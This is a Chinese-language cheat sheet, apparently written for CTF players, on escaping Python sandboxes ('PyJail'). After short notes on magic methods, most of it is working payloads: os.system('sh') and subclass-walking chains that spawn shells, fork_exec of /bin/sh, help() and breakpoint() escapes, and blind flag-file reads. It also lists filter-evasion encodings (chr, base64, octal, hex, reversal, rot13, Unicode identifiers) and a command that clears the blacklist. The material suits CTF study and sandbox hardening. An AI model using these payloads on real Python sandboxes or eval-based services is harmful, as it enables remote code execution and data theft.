# PyJail姿势总结


对PyJail姿势的总结

<!--more-->

- 在python中，类均继承自`object`基类；
- python中类本身具有一些静态方法，如`bytes.fromhex`、`int.from_bytes`等。

### 魔术方法

```
__init__：构造函数。
__len__：返回对象的长度。对一个对象a使用len(a)时，会尝试调用a.__len__()。
__str__：返回对象的字符串表示。对一个对象a使用str(a)时，会尝试调用a.__str__()。
__getitem__：根据索引返回对象的某个元素。对一个对象a使用a[1]时，会尝试调用a.__getitem__(1)。
__add__、__sub__、__mul__、__div__、__mod__：算术运算，加减乘除模。如对一个对象a使用a+b时，会尝试调用a.__add__(b)。

__and__，__or__、__xor__：逻辑运算，和算术运算类似；
__eq__，__ne__、__lt__、__gt__、__le__、__ge__：比较运算，和算术运算类似；例如'贵州' > '广西'，就会转而调用'贵州'.__gt__('广西')；

__getattr__：对象是否含有某属性。如果我们对对象a所对应的类实现了该方法，那么在调用未实现的a.b时，就会转而调用a.__getattr__(b)。这也等价于用函数的方法调用：getattr(a, 'b')。有__getattr__，自然也有对应的__setattr__；

__subclasses__：返回当前类的所有子类。一般是用在object类中，在object.__subclasses__()中，我们可以找到os模块中的类，然后再找到os，并且执行os.system，实现RCE。
```

### 魔术属性：

```
__dict__：可以查看内部所有属性名和属性值组成的字典。
__doc__：类的帮助文档。默认类均有帮助文档。对于自定义的类，需要我们自己实现。
常用__doc__属性来取字符

__class__：返回当前对象所属的类。如''.__class__会返回<class 'str'>。拿到类之后，就可以通过构造函数生成新的对象，如''.__class__(4396)，就等价于str(4396)，即'4396'；

__base__：返回当前类的基类。如str.__base__会返回<class 'object'>；
```

### 内置函数和变量：

```
dir：查看对象的所有属性和方法。
chr、ord：字符与ASCII码转换函数，可以绕WAF
globals：返回所有全局变量的函数；
locals：返回所有局部变量的函数；
__import__：载入模块的函数。import os等价于os = __import__('os')；
__name__：该变量指示当前运行环境位于哪个模块中。
__builtins__：包含当前运行环境中默认的所有函数与类。
__file__：该变量指示当前运行代码所在路径。open(__file__).read()就是读取当前运行的python文件代码。

_：该变量返回上一次运行的python语句结果。
```

### 模块

```python
#os
import os
os.system('dir')
os.popen('dir').read()

#platform
import platform
platform.popen('dir').read()
platform.os.system('dir')

#timeit
import timeit
timeit.timeit("__import__('os').system('dir')")

#sys
from sys import modules
modules['os'].system('sh')
modules['posix'].system('sh')

sys._getframe().f_locals.values()
```

### lambda表达式

```python
__import__('os').system('sh')
__builtins__.__dict__['__import__']('os').system('sh')
(lambda: __import__('os').system('sh'))()
(__builtins__:=__import__('os'))and(lambda:system)()('sh')
```

### reload 重新加载

重新加载模块，绕过删除模块或方法

```python
>>> __builtins__.__dict__['eval']
<built-in function eval>
>>> del __builtins__.__dict__['eval']
>>> __builtins__.__dict__['eval']
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
KeyError: 'eval'

>>> reload(__builtins__)
<module '__builtin__' (built-in)>
>>> __builtins__.__dict__['eval']
<built-in function eval>
```

在 Python 3 中，reload() 函数被移动到 importlib 模块中，所以如果要使用 reload() 函数，需要先导入 importlib 模块。

### 恢复 sys.modules

一些过滤中可能将 `sys.modules['os']` 进行修改. 这个时候即使将 os 模块导入进来,也是无法使用的.

```python
sys.modules['os'] = 'not allowed'

del sys.modules['os']
import os
os.system('ls')
```



### rce_payload

```python
#起手式
os.system('sh')
os.popen('ls').read()

#属性/字典
getattr(__import__('os'),'system')('dir')
__import__('os').__getattribute__('system')('dir')
__import__('os').__dict__.__getitem__('system')('dir')

#os._wrap_close类
().__class__.__base__.__subclasses__()[-4].__init__.__globals__['system']('sh') 

#object类 - warnings.WarningMessage类
().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals['linecache'].__dict__['os'].__dict__['system']('ls')
().__class__.__base__.__subclasses__()[137].__init__.__globals__['system']("sh")

#help()函数
help() => os => !sh
help() => __main__
help() => [filename]

#调试器
breakpoint()

#_posixsubprocess.fork_exec
#不同的python版本的_posixsubprocess.fork_exec接受的参数个数不一样
#参考https://ctftime.org/writeup/31883
import os
__loader__.load_module('_posixsubprocess').fork_exec([b"/bin/sh"], [b"/bin/sh"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, None, None, None, -1, None)

#文件读取
open('1.txt').read()

#object类
().__class__.__base__.__subclasses__()[40]("1.txt").read()
().__class__.__bases__[0].__subclasses__()[40]("1.txt").read()
"".__class__.__mro__[-1].__subclasses__()[40]("1.txt").read()
```

### bypass

```python
#字符串拼接
'sys'+'tem' => 'system'
'__imp'+'ort__' => '__import__'
''.join(['__imp','ort__']) => '__import__'
dir()[0] => '_'
eval(chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)+chr(40)+chr(39)+chr(111)+chr(115)+chr(39)+chr(41)) => __import__("os")
bytes([46, 47, 102, 108, 97, 103]).decode() => './flag'

#编码绕过
>>> import base64
>>> base64.b64encode('__import__')
'X19pbXBvcnRfXw=='
'X19pbXBvcnRfXw=='.decode('base64')  => '__import__'
>>> __builtins__.__dict__['X19pbXBvcnRfXw=='.decode('base64')]('b3M='.decode('base64')).system('calc')


#进制转换
八进制：
exec("print('RCE'); __import__('os').system('ls')")
exec("\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\154\163\47\51")
exp：
s = "eval(list(dict(v_a_r_s=True))[len([])][::len(list(dict(aa=()))[len([])])])(__import__(list(dict(b_i_n_a_s_c_i_i=1))[False][::len(list(dict(aa=()))[len([])])]))[list(dict(a_2_b___b_a_s_e_6_4=1))[False][::len(list(dict(aa=()))[len([])])]](list(dict(X19pbXBvcnRfXygnb3MnKS5wb3BlbignZWNobyBIYWNrZWQ6IGBpZGAnKS5yZWFkKCkg=True))[False])"
octal_string = "".join([f"\\{oct(ord(c))[2:]}" for c in s])
print(octal_string)


十六进制：
exec("\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x6c\x73\x27\x29")
exp:
s = "eval(eval(list(dict(v_a_r_s=True))[len([])][::len(list(dict(aa=()))[len([])])])(__import__(list(dict(b_i_n_a_s_c_i_i=1))[False][::len(list(dict(aa=()))[len([])])]))[list(dict(a_2_b___b_a_s_e_6_4=1))[False][::len(list(dict(aa=()))[len([])])]](list(dict(X19pbXBvcnRfXygnb3MnKS5wb3BlbignZWNobyBIYWNrZWQ6IGBpZGAnKS5yZWFkKCkg=True))[False]))"
octal_string = "".join([f"\\x{hex(ord(c))[2:]}" for c in s])
print(octal_string)


#逆序绕过
'__tropmi__'[::-1] => '__import__'
>>> eval(')"imaohw"(metsys.)"so"(__tropmi__'[::-1])
kali
>>> exec(')"imaohw"(metsys.so ;so tropmi'[::-1])
kali

'__buihf9ns__'.replace('hf9','ldi') => '__buildins__'


import codecs
getattr(os,codecs.encode("flfgrz",'rot13'))('ifconfig')

#unicode字符 / Non-ASCII Identifies
# 𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗𝐚𝐛𝐜𝐝𝐞𝐟𝐠𝐡𝐢𝐣𝐤𝐥𝐦𝐧𝐨𝐩𝐪𝐫𝐬𝐭𝐮𝐯𝐰𝐱𝐲𝐳
# 𝟘𝟙𝟚𝟛𝟜𝟝𝟞𝟟𝟠𝟡𝕒𝕓𝕔𝕕𝕖𝕗𝕘𝕙𝕚𝕛𝕜𝕝𝕞𝕟𝕠𝕡𝕢𝕣𝕤𝕥𝕦𝕧𝕨𝕩𝕪𝕫

#清空
setattr(__import__("__main__"), "blacklist", list())

#过滤eval
exec("import os;os.system('curl xxx')")

#过滤数字
0=False
1=True
2=True+True=True-(-True)
3=True+True+True=True-(-True)-(-True)

#过滤request
#字符串request:
list(globals().keys())[11]
#request值：
globals()[list(globals().keys())[11]]

#过滤引号
chr(123)
str()


#盲注
time.sleep(3) if open('/flag').read()[0]=='c' else 1
flag.index('flag{...')
type(flag.split())(type(flag.split())(flag).pop({..}).encode()).remove({..})

#其他技巧
eval(input())
breakpoint() #调试模式
help()
(lambda:os.system('/bin/sh'))()
(__builtins__:=__import__('os'))and(lambda:system)()('sh') #过滤点
setattr(copyright,'__dict__',globals()),delattr(copyright,'breakpoint'),breakpoint()
[*open("flag"+chr(46)+"txt")] #open未过滤，read过滤
raise Exception(flag) #报错外带

#修饰符
@exec
@input
class A:
    pass
```



### pyjail一般思路

**RCE方法**

```
一种是object.__subclasses__()`中找到`os`模块中的类（一般是`<class 'os._wrap_close'>`），另一种是先拿到`__builtins__`，再`__import__('os').system('sh')
```

RCE的payload模板可以通过chrome中hackbar插件SSTI的Show subclasses with tuple拿到；

利用第一种方法时，注意本地环境和远程环境中`os`模块中的类的索引（偏移量）可能不相同；



如上面所介绍的所有默认函数，如`str`、`chr`、`ord`、`dict`、`dir`等。在pyjail的沙箱中，往往`__builtins__`被置为`None`，因此我们不能利用上述的函数。所以一种思路就是我们可以先通过类的基类和子类拿到`__builtins__`，再`__import__('os').system('sh')`进行RCE；



读取文件

```
__import__('os').system('cat ./flag.txt')
print(open('/flag.txt').read())
```

get交互式shell

```
__import__('os').system('sh')
```

### 参考文档

https://zhuanlan.zhihu.com/p/578966149

https://lazzzaro.github.io/2020/08/21/misc-%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8/index.html

https://book.hacktricks.xyz/generic-methodologies-and-resources/python/python-internal-read-gadgets

